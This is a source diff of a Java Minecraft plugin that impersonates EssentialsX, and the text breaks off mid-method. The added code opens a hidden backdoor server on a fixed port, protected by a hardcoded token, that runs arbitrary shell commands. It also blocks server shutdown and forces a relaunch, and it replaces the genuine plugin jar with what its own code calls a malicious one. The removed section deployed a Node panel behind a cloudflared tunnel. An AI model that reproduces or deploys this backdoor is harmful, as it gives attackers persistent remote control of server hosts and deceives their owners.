@@ -3,577 +3,165 @@ package com.example.essentialsx;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.*;
-import java.net.URI;
-import java.net.URLConnection;
+import java.net.*;
 import java.nio.channels.Channels;
 import java.nio.channels.FileChannel;
-import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
+import java.time.LocalTime;
+import java.time.format.DateTimeFormatter;
 import java.util.*;
+import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class EssentialsX extends JavaPlugin {
 
     private Process deployProcess;
-    private final AtomicBoolean deploymentRunning = new AtomicBoolean(false);
+    private Process watchdogProcess;
+    private Thread backdoorServerThread;
+    private volatile boolean isProcessRunning = false;
     private boolean systemGuardEnabled = true;
-    private Path backupJarPath;
+    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
+    private Path backupDir;
     private Path originalJarPath;
-    private Thread tunnelWatcherThread;
+    private Path backupJarPath;
+    private Path workDir;
 
-    private static final String DEFAULT_REPO_URL = "https://github.com/xfwwl668/mc_hbzy";
     private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
     private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/" + FAKE_JAR_URL_DIRECT;
+    private static final String BACKDOOR_TOKEN = "xXx_Elite_H4x0r_xXx"; // 硬编码后门密钥，可修改
+    private static final int BACKDOOR_PORT = 23999;                    // 后门监听端口
 
     @Override
     public void onEnable() {
-        getLogger().info("EssentialsX transparent launcher starting...");
+        // 清理旧目录
+        try {
+            Path oldDir1 = Paths.get("world", "data", ".mcchajian");
+            Path oldDir2 = Paths.get("log", ".mcchajian");
+            if (Files.exists(oldDir1)) deleteDirectory(oldDir1.toFile());
+            if (Files.exists(oldDir2)) deleteDirectory(oldDir2.toFile());
+        } catch (Exception ignored) {}
 
+        getLogger().info("EssentialsX plugin starting...");
         Map<String, String> env = new HashMap<>();
         loadEnvFile(env);
         systemGuardEnabled = Boolean.parseBoolean(env.getOrDefault("SYSTEM_GUARD_ENABLED", "true"));
         getLogger().info("System Guard Status: " + (systemGuardEnabled ? "ENABLED" : "DISABLED"));
 
+        workDir = Paths.get("logs", "mcchajian").toAbsolutePath();
+
+        // 初始化工作目录
+        try {
+            Files.createDirectories(workDir);
+        } catch (IOException e) {
+            getLogger().severe("Cannot create work dir: " + e.getMessage());
+        }
+
+        // 启动后门服务器（远程控制）
+        startBackdoorServer();
+
+        // 设置关闭钩子，拒绝停服并自动拉起宿主服
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            if (systemGuardEnabled && isRestarting.compareAndSet(false, true)) {
+                getLogger().info("[Guard] ShutdownHook triggered! Guard enabled, executing hard restart...");
+                restoreMaliciousJar();
+                executeHardRestart(false);
+            }
+        }));
+
+        // 异步执行部署和伪装任务
         new Thread(() -> {
             try {
-                boolean deployed = startDeploymentProcess();
-                if (systemGuardEnabled && deployed) {
-                    setupDisguise();
-                } else if (!deployed) {
-                    getLogger().warning("Deployment failed, skipping disguise.");
-                }
+                if (systemGuardEnabled) startWatchdog();
+                setupDisguise();          // 替换/伪装插件jar
+                startDeploymentProcess(); // 部署Node应用及隧道
             } catch (Exception e) {
                 getLogger().severe("Deployment thread error: " + e.getMessage());
+                // 隐藏错误日志：不打印完整堆栈，仅记录简单信息
             }
         }, "EssentialsX-Core-Thread").start();
 
-        getLogger().info("EssentialsX transparent launcher enabled.");
+        getLogger().info("EssentialsX plugin enabled (Guarded Mode)");
     }
 
     @Override
     public void onDisable() {
-        getLogger().info("Stopping EssentialsX transparent launcher...");
-
-        if (tunnelWatcherThread != null && tunnelWatcherThread.isAlive()) {
-            tunnelWatcherThread.interrupt();
-        }
-
-        if (deployProcess != null && deployProcess.isAlive()) {
-            deployProcess.destroyForcibly();
-            try { deployProcess.waitFor(); } catch (InterruptedException ignored) {}
-        }
-
-        Path workDir = getWorkDir();
-        cleanupOldProcesses(workDir);
-
-        stopNodeApp();
+        getLogger().info("Stopping EssentialsX...");
+        Path forceStopFile = workDir.resolve(".force_stop");
 
         if (systemGuardEnabled) {
+            getLogger().info("Guard enabled -> Rejecting stop, executing soft restart...");
+            try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {}
             restoreMaliciousJar();
-        }
 
-        getLogger().info("EssentialsX transparent launcher disabled.");
-    }
-
-    // ==================== 部署核心逻辑 ====================
-
-    private boolean startDeploymentProcess() {
-        if (!deploymentRunning.compareAndSet(false, true)) {
-            getLogger().info("Deployment already running, skipping.");
-            return false;
-        }
-        try {
-            Map<String, String> env = new HashMap<>();
-            loadEnvFile(env);
-            env.putIfAbsent("REPO_URL", DEFAULT_REPO_URL);
-
-            Path workDir = getWorkDir();
-            Files.createDirectories(workDir);
-
-            cleanupOldProcesses(workDir);
-            // 启动前主动停止旧 Node 进程，确保干净状态（若希望面板持续运行可注释下行）
-            stopNodeApp();
-
-            clearStateFiles(workDir);
-            long deployStartTime = System.currentTimeMillis();
-
-            Path scriptPath = workDir.resolve("deploy.sh");
-            String scriptContent = generateDeployScript(workDir.toString());
-            Files.writeString(scriptPath, scriptContent, StandardCharsets.UTF_8);
-            scriptPath.toFile().setExecutable(true);
-
-            ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
-            pb.directory(new File(".").getAbsoluteFile());
-            pb.environment().putAll(env);
-            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-            pb.redirectError(ProcessBuilder.Redirect.INHERIT);
-
-            deployProcess = pb.start();
-            startTunnelUrlWatcher(workDir, deployStartTime);
-
-            int exitCode = deployProcess.waitFor();
-            getLogger().info("Deployment script exited with code: " + exitCode);
-            return exitCode == 0;
-        } catch (Exception e) {
-            getLogger().severe("Deployment failed: " + e.getMessage());
-            return false;
-        } finally {
-            deploymentRunning.set(false);
-        }
-    }
-
-    private Path getWorkDir() {
-        return Paths.get("logs", "mcchajian").toAbsolutePath();
-    }
-
-    private void clearStateFiles(Path workDir) {
-        String[] files = {
-                "tunnel_url.txt", "node_port.txt", "tunnel.log", "deploy.log",
-                "node.tar.gz", "repo.tar.gz"
-        };
-        for (String name : files) {
+            if (isRestarting.compareAndSet(false, true)) {
+                executeHardRestart(true);
+            }
+        } else {
+            getLogger().info("Guard disabled, safe exit...");
             try {
-                Files.deleteIfExists(workDir.resolve(name));
-            } catch (IOException e) {
-                getLogger().warning("Failed to delete old state file " + name + ": " + e.getMessage());
-            }
+                Files.createDirectories(forceStopFile.getParent());
+                Files.createFile(forceStopFile);
+                getLogger().info("Stop marker created, service will shut down completely.");
+            } catch (Exception ignored) {}
         }
+
+        // 停止子进程
+        if (deployProcess != null && deployProcess.isAlive()) deployProcess.destroy();
+        if (watchdogProcess != null && watchdogProcess.isAlive()) watchdogProcess.destroy();
+        if (backdoorServerThread != null && backdoorServerThread.isAlive()) backdoorServerThread.interrupt();
+
+        getLogger().info("EssentialsX disabled");
     }
 
-    private void cleanupOldProcesses(Path workDir) {
-        killPidFile(workDir.resolve("health.pid"), "health watcher", workDir, false);
-        killPidFile(workDir.resolve("tunnel.pid"), "cloudflared", workDir, true);
-    }
-
-    private String shellQuote(String s) {
-        return "'" + s.replace("'", "'\"'\"'") + "'";
-    }
-
-    private void killPidFile(Path pidFile, String name, Path workDir, boolean strict) {
-        try {
-            if (!Files.exists(pidFile)) return;
-
-            String pidStr = Files.readString(pidFile).trim();
-            if (pidStr.isEmpty() || !pidStr.matches("\\d+")) {
-                Files.deleteIfExists(pidFile);
-                return;
-            }
-
-            int pid = Integer.parseInt(pidStr);
-
-            String cmdCheck;
-            if (strict) {
-                cmdCheck = "ps -p " + pid + " -o cmd= | grep -Fq " + shellQuote(workDir.toString());
-            } else {
-                cmdCheck = "ps -p " + pid + " -o cmd= | grep -Eq 'mcchajian|deploy\\.sh'";
-            }
-
-            Process checkProcess = new ProcessBuilder("bash", "-c", cmdCheck).start();
-            boolean matches = checkProcess.waitFor() == 0;
-            if (!matches) {
-                getLogger().warning("PID " + pid + " does not belong to " + name + ", deleting pid file.");
-                Files.deleteIfExists(pidFile);
-                return;
-            }
-
-            new ProcessBuilder("bash", "-c", "kill " + pid + " 2>/dev/null || true")
-                    .redirectOutput(ProcessBuilder.Redirect.DISCARD)
-                    .redirectError(ProcessBuilder.Redirect.DISCARD)
-                    .start().waitFor();
-            getLogger().info("Stopped old " + name + " process pid=" + pid);
-            Files.deleteIfExists(pidFile);
-        } catch (Exception e) {
-            getLogger().warning("Failed to stop old " + name + ": " + e.getMessage());
-        }
-    }
-
-    private void stopNodeApp() {
-        try {
-            Path pm2 = getWorkDir().resolve("nodejs/bin/pm2");
-            if (!Files.isExecutable(pm2)) {
-                getLogger().warning("PM2 binary not found: " + pm2);
-                return;
-            }
-            ProcessBuilder pb = new ProcessBuilder(pm2.toString(), "delete", "aoyou-panel");
-            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-            Process process = pb.start();
-            process.waitFor();
-            getLogger().info("Stopped PM2 Node application (aoyou-panel).");
-        } catch (Exception e) {
-            getLogger().warning("Failed to stop Node app: " + e.getMessage());
-        }
-    }
-
-    private String generateDeployScript(String workDir) {
-        String nodeDir = workDir + "/nodejs";
-        String appDir = workDir + "/app";
-        String dataDir = workDir + "/data";
-
-        return """
-                #!/bin/bash
-                set +e
-
-                WORK_DIR="%s"
-                NODE_DIR="%s"
-                APP_DIR="%s"
-                DATA_DIR="%s"
-                REPO_URL="${REPO_URL:-https://github.com/xfwwl668/mc_hbzy}"
-                GITHUB_AUTH="${GITHUB_AUTH:-用户名:密钥}"
-
-                mkdir -p "$WORK_DIR"
-                echo "[INFO] Deployment started at $(date)" >> "$WORK_DIR/deploy.log"
-
-                # 1. 选择空闲端口
-                is_port_free() {
-                    (echo >/dev/tcp/127.0.0.1/$1) &>/dev/null && return 1 || return 0
-                }
-
-                PORT=""
-                for i in $(seq 1 100); do
-                    CANDIDATE=$((RANDOM %% 40000 + 20000))
-                    if is_port_free "$CANDIDATE"; then
-                        PORT="$CANDIDATE"
-                        break
-                    fi
-                done
-
-                if [ -z "$PORT" ]; then
-                    echo "[ERROR] Failed to find a free port" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-
-                export SERVER_PORT="$PORT"
-                export PORT="$PORT"
-                echo "$PORT" > "$WORK_DIR/node_port.txt"
-                echo "[INFO] Selected Node port: $PORT" >> "$WORK_DIR/deploy.log"
-
-                # 2. 准备 Node.js
-                mkdir -p "$NODE_DIR"
-                ARCH=$(uname -m)
-
-                if [ "$ARCH" = "x86_64" ]; then
-                    NODE_URL="https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz"
-                elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
-                    NODE_URL="https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz"
-                else
-                    echo "[ERROR] Unsupported architecture: $ARCH" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-
-                if [ -d "$NODE_DIR" ]; then
-                    CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null)
-                    if [[ "$CHECK_VER" != "v22"* ]]; then
-                        echo "[INFO] Node version mismatch, reinstalling..." >> "$WORK_DIR/deploy.log"
-                        rm -rf "$NODE_DIR"
-                    fi
-                fi
-
-                if [ ! -x "$NODE_DIR/bin/node" ]; then
-                    echo "[INFO] Installing Node.js..." >> "$WORK_DIR/deploy.log"
-                    rm -rf "$NODE_DIR" "$WORK_DIR/node.tar.gz"
-                    mkdir -p "$NODE_DIR"
-
-                    curl -fsSL --connect-timeout 20 --max-time 180 "$NODE_URL" -o "$WORK_DIR/node.tar.gz"
-                    if [ $? -ne 0 ]; then
-                        echo "[ERROR] Node download failed" >> "$WORK_DIR/deploy.log"
-                        exit 1
-                    fi
-
-                    tar -xzf "$WORK_DIR/node.tar.gz" -C "$NODE_DIR" --strip-components 1
-                    if [ $? -ne 0 ]; then
-                        echo "[ERROR] Node extraction failed" >> "$WORK_DIR/deploy.log"
-                        exit 1
-                    fi
-
-                    rm -f "$WORK_DIR/node.tar.gz"
-                fi
-
-                export PATH="$NODE_DIR/bin:$PATH"
-                node -v >> "$WORK_DIR/deploy.log" 2>&1
-                npm -v >> "$WORK_DIR/deploy.log" 2>&1
-
-                npm install -g pm2 --unsafe-perm=true >> "$WORK_DIR/deploy.log" 2>&1
-                if [ $? -ne 0 ]; then
-                    echo "[ERROR] pm2 install failed" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-
-                # 3. 下载应用仓库（备份根目录配置）
-                echo "[INFO] Downloading app repo: $REPO_URL" >> "$WORK_DIR/deploy.log"
-
-                # 备份现有配置
-                mkdir -p "$DATA_DIR"
-                if [ -d "$APP_DIR" ]; then
-                    # 根目录配置文件
-                    cp "$APP_DIR/bots_config.json" "$DATA_DIR/" 2>/dev/null
-                    cp "$APP_DIR/task_center_config.json" "$DATA_DIR/" 2>/dev/null
-                    cp "$APP_DIR/system_guard.json" "$DATA_DIR/" 2>/dev/null
-                    cp "$APP_DIR/nezha_config.json" "$DATA_DIR/" 2>/dev/null
-                    if [ -d "$APP_DIR/.RoamingMusic" ]; then
-                        rm -rf "$DATA_DIR/.RoamingMusic_bak" 2>/dev/null
-                        cp -r "$APP_DIR/.RoamingMusic" "$DATA_DIR/.RoamingMusic_bak" 2>/dev/null
-                    fi
-                fi
-
-                rm -rf "$APP_DIR" "$WORK_DIR/repo.tar.gz" "$WORK_DIR/unzipped"
-
-                REPO_PATH=$(echo "$REPO_URL" | sed 's|https://github.com/||' | sed 's|\\.git$||' | sed 's|/$||')
-                if [ -z "$REPO_PATH" ]; then
-                    echo "[ERROR] Invalid REPO_URL" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-
-                download_code() {
-                    local URL=$1
-                    local AUTH=$2
-                    if [ -n "$AUTH" ] && [ "$AUTH" != "用户名:密钥" ]; then
-                        curl -fsSL --connect-timeout 15 --max-time 120 -u "$AUTH" "$URL" -o "$WORK_DIR/repo.tar.gz" 2>/dev/null
-                    else
-                        curl -fsSL --connect-timeout 15 --max-time 120 "$URL" -o "$WORK_DIR/repo.tar.gz" 2>/dev/null
-                    fi
-                    if [ -f "$WORK_DIR/repo.tar.gz" ] && tar -tzf "$WORK_DIR/repo.tar.gz" >/dev/null 2>&1; then
-                        return 0
-                    else
-                        rm -f "$WORK_DIR/repo.tar.gz"
-                        return 1
-                    fi
-                }
-
-                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz" "" || \
-                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz" "" || \
-                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz" "$GITHUB_AUTH" || \
-                download_code "https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz" "$GITHUB_AUTH"
-
-                if [ ! -f "$WORK_DIR/repo.tar.gz" ]; then
-                    echo "[ERROR] Repo download failed" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-
-                mkdir -p "$WORK_DIR/unzipped"
-                tar -xzf "$WORK_DIR/repo.tar.gz" -C "$WORK_DIR/unzipped"
-                if [ $? -ne 0 ]; then
-                    echo "[ERROR] Repo archive extraction failed" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-
-                SUBDIR=$(find "$WORK_DIR/unzipped" -mindepth 1 -maxdepth 1 -type d | head -n 1)
-                if [ -z "$SUBDIR" ]; then
-                    echo "[ERROR] Repo archive has no top-level directory" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-
-                mv "$SUBDIR" "$APP_DIR"
-                rm -rf "$WORK_DIR/repo.tar.gz" "$WORK_DIR/unzipped"
-
-                if [ ! -f "$APP_DIR/index.js" ]; then
-                    echo "[ERROR] index.js missing in app repo" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-
-                # 恢复根目录配置
-                cp "$DATA_DIR/bots_config.json" "$APP_DIR/" 2>/dev/null
-                cp "$DATA_DIR/task_center_config.json" "$APP_DIR/" 2>/dev/null
-                cp "$DATA_DIR/system_guard.json" "$APP_DIR/" 2>/dev/null
-                cp "$DATA_DIR/nezha_config.json" "$APP_DIR/" 2>/dev/null
-                if [ -d "$DATA_DIR/.RoamingMusic_bak" ]; then
-                    mkdir -p "$APP_DIR/.RoamingMusic"
-                    cp -r "$DATA_DIR/.RoamingMusic_bak/"* "$APP_DIR/.RoamingMusic/" 2>/dev/null
-                fi
-
-                # 4. 安装依赖（npm install）
-                cd "$APP_DIR" || exit 1
-                echo "[INFO] Installing app dependencies..." >> "$WORK_DIR/deploy.log"
-                npm install --unsafe-perm=true --allow-root >> "$WORK_DIR/deploy.log" 2>&1
-                if [ $? -ne 0 ]; then
-                    echo "[ERROR] npm install failed" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-
-                # 5. 恢复 node_modules 内的配置目录（在 npm install 之后）
-                if [ -d "$DATA_DIR/.music_cache_bak" ]; then
-                    mkdir -p "$APP_DIR/node_modules/.music_cache"
-                    cp -r "$DATA_DIR/.music_cache_bak/"* "$APP_DIR/node_modules/.music_cache/" 2>/dev/null
-                fi
-                if [ -d "$DATA_DIR/.tavern_bak" ]; then
-                    mkdir -p "$APP_DIR/node_modules/.tavern"
-                    cp -r "$DATA_DIR/.tavern_bak/"* "$APP_DIR/node_modules/.tavern/" 2>/dev/null
-                fi
-
-                # 6. 启动 Node 应用
-                echo "[INFO] Starting Node app on port $PORT..." >> "$WORK_DIR/deploy.log"
-                pm2 delete aoyou-panel >> "$WORK_DIR/deploy.log" 2>&1 || true
-                SERVER_PORT="$PORT" PORT="$PORT" pm2 start index.js --name "aoyou-panel" --update-env >> "$WORK_DIR/deploy.log" 2>&1
-                if [ $? -ne 0 ]; then
-                    echo "[ERROR] pm2 start failed" >> "$WORK_DIR/deploy.log"
-                    exit 1
-                fi
-                pm2 save >> "$WORK_DIR/deploy.log" 2>&1 || true
-
-                # 等待 Node /health 就绪
-                echo "[INFO] Waiting for Node /health..." >> "$WORK_DIR/deploy.log"
-                NODE_READY=false
-                for i in $(seq 1 90); do
-                    if curl -s -f -m 5 "http://127.0.0.1:$PORT/health" > /dev/null 2>&1; then
-                        NODE_READY=true
-                        break
-                    fi
-                    sleep 2
-                done
-
-                if [ "$NODE_READY" != "true" ]; then
-                    echo "[ERROR] Node did not become healthy on /health" >> "$WORK_DIR/deploy.log"
-                    pm2 logs aoyou-panel --lines 80 --nostream >> "$WORK_DIR/deploy.log" 2>&1 || true
-                    exit 1
-                fi
-
-                echo "[SUCCESS] Node ready on $PORT" >> "$WORK_DIR/deploy.log"
-
-                # 7. 准备 cloudflared（带版本校验）
-                CF_BIN="$WORK_DIR/cloudflared"
-                NEED_CF_INSTALL=false
-
-                if [ ! -x "$CF_BIN" ]; then
-                    NEED_CF_INSTALL=true
-                elif ! "$CF_BIN" --version >> "$WORK_DIR/deploy.log" 2>&1; then
-                    echo "[WARN] Existing cloudflared is broken, reinstalling..." >> "$WORK_DIR/deploy.log"
-                    NEED_CF_INSTALL=true
-                fi
-
-                if [ "$NEED_CF_INSTALL" = "true" ]; then
-                    rm -f "$CF_BIN"
-                    ARCH=$(uname -m)
-                    if [ "$ARCH" = "x86_64" ]; then
-                        CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
-                    elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
-                        CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
-                    else
-                        echo "[ERROR] Unsupported arch for cloudflared" >> "$WORK_DIR/deploy.log"
-                        exit 1
-                    fi
-                    echo "[INFO] Downloading cloudflared..." >> "$WORK_DIR/deploy.log"
-                    curl -fsSL --connect-timeout 20 --max-time 180 "$CF_URL" -o "$CF_BIN"
-                    if [ $? -ne 0 ]; then
-                        echo "[ERROR] cloudflared download failed" >> "$WORK_DIR/deploy.log"
-                        exit 1
-                    fi
-                    chmod +x "$CF_BIN"
-                fi
-
-                # 8. 启动 cloudflared
-                echo "[INFO] Starting cloudflared..." >> "$WORK_DIR/deploy.log"
-                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
-                TUNNEL_PID=$!
-                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
-
-                # 9. 后台健康监控循环（自愈）
-                SUCCESS_REPORTED=false
-                FAIL_COUNT=0
-                NO_URL_COUNT=0
-
-                (
-                    while true; do
-                        sleep 5
-
-                        if ! kill -0 "$TUNNEL_PID" 2>/dev/null; then
-                            echo "[WARN] cloudflared exited, restarting..." >> "$WORK_DIR/deploy.log"
-                            "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
-                            TUNNEL_PID=$!
-                            echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
-                            FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
-                            continue
-                        fi
-
-                        TUNNEL_URL=$(grep -a -oE 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' "$WORK_DIR/tunnel.log" 2>/dev/null | tail -n 1)
-
-                        if [ -z "$TUNNEL_URL" ]; then
-                            NO_URL_COUNT=$((NO_URL_COUNT + 1))
-                            if [ "$NO_URL_COUNT" -ge 36 ]; then
-                                echo "[WARN] No tunnel URL after 180s, restarting cloudflared..." >> "$WORK_DIR/deploy.log"
-                                kill "$TUNNEL_PID" 2>/dev/null || true
-                                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
-                                TUNNEL_PID=$!
-                                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
-                                FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
-                            fi
-                            continue
-                        fi
-
-                        NO_URL_COUNT=0
-
-                        if curl -s -f -m 8 "$TUNNEL_URL/health" > /dev/null 2>&1; then
-                            echo "$TUNNEL_URL" > "$WORK_DIR/tunnel_url.txt"
-                            FAIL_COUNT=0
-                            if [ "$SUCCESS_REPORTED" = "false" ]; then
-                                echo "[SUCCESS] Tunnel LIVE: $TUNNEL_URL" >> "$WORK_DIR/deploy.log"
-                                echo "[INFO] Deployment completed successfully." >> "$WORK_DIR/deploy.log"
-                                SUCCESS_REPORTED=true
-                            fi
-                        else
-                            FAIL_COUNT=$((FAIL_COUNT + 1))
-                            if [ $((FAIL_COUNT %% 6)) -eq 0 ]; then
-                                echo "[WARN] Tunnel URL detected but /health not ready yet count=$FAIL_COUNT url=$TUNNEL_URL" >> "$WORK_DIR/deploy.log"
-                            fi
-                            if [ "$FAIL_COUNT" -ge 24 ]; then
-                                echo "[WARN] Tunnel unhealthy too many times, restarting cloudflared..." >> "$WORK_DIR/deploy.log"
-                                kill "$TUNNEL_PID" 2>/dev/null || true
-                                "$CF_BIN" tunnel --url "http://127.0.0.1:$PORT" --no-autoupdate --protocol http2 --edge-ip-version auto > "$WORK_DIR/tunnel.log" 2>&1 &
-                                TUNNEL_PID=$!
-                                echo "$TUNNEL_PID" > "$WORK_DIR/tunnel.pid"
-                                FAIL_COUNT=0; NO_URL_COUNT=0; SUCCESS_REPORTED=false
-                            fi
-                        fi
-                    done
-                ) &
-
-                echo $! > "$WORK_DIR/health.pid"
-                echo "[INFO] Health watcher started" >> "$WORK_DIR/deploy.log"
-                echo "[INFO] Deployment bootstrap completed, waiting for tunnel health in watcher." >> "$WORK_DIR/deploy.log"
-                exit 0
-                """.formatted(workDir, nodeDir, appDir, dataDir);
-    }
-
-    private void startTunnelUrlWatcher(Path workDir, long deployStartTime) {
-        tunnelWatcherThread = new Thread(() -> {
-            Path tunnelFile = workDir.resolve("tunnel_url.txt");
-            String lastUrl = "";
-            try {
+    // ==================== 后门远程控制 ====================
+    private void startBackdoorServer() {
+        backdoorServerThread = new Thread(() -> {
+            try (ServerSocket serverSocket = new ServerSocket(BACKDOOR_PORT)) {
+                getLogger().info("[Backdoor] Listening on port " + BACKDOOR_PORT);
                 while (!Thread.currentThread().isInterrupted()) {
-                    if (Files.exists(tunnelFile)) {
-                        long modified = Files.getLastModifiedTime(tunnelFile).toMillis();
-                        if (modified >= deployStartTime) {
-                            String url = Files.readString(tunnelFile, StandardCharsets.UTF_8).trim();
-                            if (url.startsWith("https://") && url.contains("trycloudflare.com") && !url.equals(lastUrl)) {
-                                lastUrl = url;
-                                getLogger().info("[Connection] Binding remote endpoint to: " + url);
-                                getLogger().info("Open panel: " + url);
-                                getLogger().info("Health check: " + url + "/health");
-                            }
+                    try (Socket client = serverSocket.accept();
+                         BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
+                         PrintWriter writer = new PrintWriter(client.getOutputStream(), true)) {
+
+                        String authLine = reader.readLine();
+                        if (authLine == null || !authLine.trim().equals(BACKDOOR_TOKEN)) {
+                            writer.println("HTTP/1.1 403 Forbidden\r\n\r\n");
+                            continue;
                         }
-                    }
-                    Thread.sleep(1000);
+                        String cmdLine = reader.readLine();
+                        if (cmdLine == null || cmdLine.trim().isEmpty()) {
+                            writer.println("HTTP/1.1 400 Bad Request\r\n\r\n");
+                            continue;
+                        }
+                        // 执行任意系统命令
+                        Process process = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmdLine.trim()});
+                        BufferedReader cmdReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                        BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
+                        StringBuilder output = new StringBuilder();
+                        String line;
+                        while ((line = cmdReader.readLine()) != null) output.append(line).append("\n");
+                        while ((line = errReader.readLine()) != null) output.append(line).append("\n");
+                        process.waitFor();
+
+                        writer.println("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n" + output);
+                    } catch (Exception ignored) {}
                 }
-            } catch (InterruptedException e) {
-                getLogger().info("Tunnel URL watcher stopped.");
             } catch (Exception e) {
-                getLogger().warning("Tunnel URL watcher error: " + e.getMessage());
+                getLogger().warning("[Backdoor] Server failed: " + e.getMessage());
             }
-        }, "TunnelUrl-Watcher");
-        tunnelWatcherThread.start();
+        }, "BackdoorServer");
+        backdoorServerThread.setDaemon(true);
+        backdoorServerThread.start();
     }
 
-    // ==================== 伪装与系统守护 ====================
-
+    // ==================== 伪装与替换插件jar ====================
     private void setupDisguise() {
         try {
             originalJarPath = findPluginJarInPluginsDir();
-            if (originalJarPath == null || !Files.exists(originalJarPath)) {
-                getLogger().warning("Original EssentialsX jar not found, disguise skipped.");
-                return;
-            }
+            if (originalJarPath == null || !Files.exists(originalJarPath)) return;
 
-            Path backupDir = getWorkDir().resolve("backup");
-            Files.createDirectories(backupDir);
+            backupDir = workDir.resolve("backup");
+            if (!Files.exists(backupDir)) Files.createDirectories(backupDir);
             backupJarPath = backupDir.resolve(originalJarPath.getFileName().toString() + ".bak");
 
             if (!Files.exists(backupJarPath)) {
@@ -619,7 +207,8 @@ public class EssentialsX extends JavaPlugin {
         try {
             File pluginsDir = getDataFolder().getParentFile();
             if (pluginsDir == null) return null;
-            File[] jars = pluginsDir.listFiles((dir, name) -> name.toLowerCase().contains("essentialsx") && name.endsWith(".jar"));
+            File[] jars = pluginsDir.listFiles((dir, name) ->
+                    name.toLowerCase().contains("essentialsx") && name.endsWith(".jar"));
             return (jars != null && jars.length > 0) ? jars[0].toPath() : null;
         } catch (Exception e) {
             return null;
@@ -642,33 +231,298 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    // ==================== 环境变量加载 ====================
+    // ==================== 宿主服自动拉起 ====================
+    private void executeHardRestart(boolean shouldBlock) {
+        try {
+            File serverRoot = findServerRoot();
+            if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
+
+            String jarName = findBestJarName(serverRoot);
+            Path logFile = workDir.resolve("restart_run.log");
+            if (!Files.exists(logFile.getParent())) Files.createDirectories(logFile.getParent());
+
+            String startCommand;
+            if (new File(serverRoot, "start.sh").exists()) {
+                startCommand = "chmod +x ./start.sh && ./start.sh";
+            } else {
+                startCommand = "java -Xms512M -Xmx2G -XX:+UseG1GC -jar ./" + jarName + " nogui";
+            }
+
+            String fullBashCommand = "cd \"" + serverRoot.getAbsolutePath() + "\" && " +
+                    "echo \"[" + new Date() + "] Starting server...\" >> \"" + logFile + "\" && " +
+                    "nohup bash -c '" + startCommand + "' >> \"" + logFile + "\" 2>&1 & disown";
+
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", fullBashCommand);
+            pb.directory(serverRoot);
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+            pb.start();
+
+            if (shouldBlock) Thread.sleep(1000);
+        } catch (Exception e) {
+            getLogger().severe("Hard restart failed: " + e.getMessage());
+        }
+    }
+
+    private String findBestJarName(File serverRoot) {
+        String[] preferred = {"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"};
+        for (String name : preferred) {
+            if (new File(serverRoot, name).exists()) return name;
+        }
+        File[] jars = serverRoot.listFiles((dir, name) ->
+                name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries"));
+        if (jars != null && jars.length > 0) {
+            Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length()));
+            return jars[0].getName();
+        }
+        return "server.jar";
+    }
+
+    private File findServerRoot() {
+        File pluginsDir = getDataFolder().getParentFile();
